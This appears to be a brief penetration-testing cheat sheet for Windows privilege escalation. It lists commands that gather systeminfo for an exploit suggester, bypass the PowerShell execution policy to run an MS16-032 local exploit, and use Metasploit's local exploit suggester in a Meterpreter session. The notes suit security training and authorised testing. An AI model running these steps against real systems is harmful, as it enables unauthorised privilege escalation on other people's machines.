# Windows Desktop Versions

## Windows 7 Enumeration

```bash
systeminfo
python2.7 windows-exploit-suggester.py --update
python2.7 windows-exploit-suggester.py --database <database_file>.xls --systeminfo <systeminfo_file>.txt
```

---

## PowerShell - MS16-032

```powershell
powershell.exe -ExecutionPolicy Bypass -Scope Process
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

---

## Meterpreter - Local Exploit Suggester

```bash
use post/multi/recon/local_exploit_suggester
set SESSION <session_id>
exploit
```
